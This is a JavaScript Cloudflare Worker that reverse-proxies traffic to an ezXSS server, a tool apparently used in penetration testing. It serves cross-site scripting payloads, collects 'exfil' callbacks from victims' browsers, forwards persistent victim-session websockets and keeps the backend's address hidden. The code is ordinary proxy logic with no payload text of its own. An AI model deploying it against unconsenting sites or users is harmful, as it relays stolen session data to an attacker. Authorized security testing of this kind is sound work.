/**
 * Cloudflare Worker reverse proxy for ezXSS.
 *
 * To deploy: set the worker env vars (BACKEND_HOST, BACKEND_PORT, BACKEND_PROTOCOL, and optionally the EZPROXY_* trio) in the Cloudflare dashboard or wrangler.toml 
 * no code edits needed per environment.
 *
 * Routes covered (all proxied transparently to the ezXSS backend):
 *   GET  /                       -> JS payload (Trigger::index)
 *   GET  /<name>                 -> custom JS payload (Trigger::custom)
 *   POST /callback               -> exfil callback (Trigger::callback)
 *   GET  /manage/...             -> admin dashboard (sessions, login)
 *   POST /manage/.../...         -> admin AJAX endpoints
 *   GET  /assets/...             -> css/js/img
 *   GET  /.well-known/...        -> ACME / security.txt / humans.txt
 *   WS   *                       -> ezProxy persistent-session websocket
 *                                   (only if EZPROXY_HOST is set, otherwise
 *                                    persistent clients should connect direct)
 *
 * Configure via Worker environment variables / secrets:
 *   BACKEND_HOST       e.g. "1.2.3.4" or "ezxss.internal"  (required)
 *   BACKEND_PORT       e.g. "8080"                          (default "80")
 *   BACKEND_PROTOCOL   "http" or "https"                    (default "http")
 *   EZPROXY_HOST       host of ezProxy ws server, optional
 *   EZPROXY_PORT       e.g. "30055", optional
 *   EZPROXY_TLS        "1" if ezProxy is behind TLS         (default "1")
 */

export default {
  async fetch(request, env) {
    const backendHost = env.BACKEND_HOST || "YOUR_SERVER_IP";
    const backendPort = env.BACKEND_PORT || "80";
    const backendProto = (env.BACKEND_PROTOCOL || "http").replace(":", "");

    const incoming = new URL(request.url);
    const isWebSocket =
      request.headers.get("Upgrade")?.toLowerCase() === "websocket";

    // ezProxy websocket pass-through (persistent sessions).
    // Only enabled when EZPROXY_HOST is configured; otherwise clients should
    // connect directly to the ezProxy server (it runs separately from ezXSS).
    if (isWebSocket && env.EZPROXY_HOST) {
      const wsUrl = new URL(incoming);
      wsUrl.hostname = env.EZPROXY_HOST;
      wsUrl.port = env.EZPROXY_PORT || "30055";
      // fetch() always speaks http(s); the Upgrade header carries the ws intent.
      wsUrl.protocol = env.EZPROXY_TLS === "0" ? "http:" : "https:";
      return fetch(new Request(wsUrl.toString(), request));
    }

    // Build upstream URL pointing at the ezXSS PHP backend.
    const upstream = new URL(incoming);
    upstream.hostname = backendHost;
    upstream.port = backendPort;
    upstream.protocol = `${backendProto}:`;

    // CORS preflight (the PHP Trigger controller sets these too, but preflight
    // never reaches PHP because we want to answer at the edge).
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    const clientIP =
      request.headers.get("CF-Connecting-IP") ||
      request.headers.get("X-Real-IP") ||
      "";

    const headers = new Headers(request.headers);
    // Preserve client IP for ezXSS callback (it reads
    // HTTP_CF_CONNECTING_IP -> HTTP_X_REAL_IP -> REMOTE_ADDR, in that order).
    if (clientIP) {
      headers.set("X-Forwarded-For", clientIP);
      headers.set("X-Real-IP", clientIP);
      headers.set("CF-Connecting-IP", clientIP);
    }
    headers.set("X-Forwarded-Proto", incoming.protocol.replace(":", ""));
    headers.set("X-Forwarded-Host", incoming.host);
    // Make the backend see the original host (not the upstream IP), so any
    // absolute URLs the app generates are correct and vhost routing works.
    headers.set("Host", incoming.host);

    // Drop Cloudflare-specific noise the backend doesn't need.
    headers.delete("CF-Ray");
    headers.delete("CF-Visitor");
    headers.delete("CF-IPCountry");
    headers.delete("CDN-Loop");

    // Backend websocket pass-through (only reached if EZPROXY_HOST wasn't set;
    // covers the case where ezXSS itself is fronted by something handling ws).
    if (isWebSocket) {
      return fetch(
        new Request(upstream.toString(), {
          method: request.method,
          headers,
          body: request.body,
        }),
      );
    }

    const isPublic =
      incoming.pathname === "/" ||
      incoming.pathname === "/callback" ||
      !incoming.pathname.startsWith("/manage");

    const upstreamResponse = await fetch(
      new Request(upstream.toString(), {
        method: request.method,
        headers,
        body: ["GET", "HEAD"].includes(request.method) ? null : request.body,
        // Manual: 302s from the admin login flow must reach the browser so the
        // session cookie sticks and the client lands on /manage/dashboard.
        redirect: "manual",
      }),
    );

    const response = new Response(upstreamResponse.body, upstreamResponse);

    // Mirror PHP Trigger CORS for public endpoints. Avoid forcing CORS on
    // /manage/* so the admin panel keeps its same-origin semantics.
    if (isPublic) {
      response.headers.set("Access-Control-Allow-Origin", "*");
      response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
      response.headers.set("Access-Control-Allow-Headers", "*");
    }

    return response;
  },
};
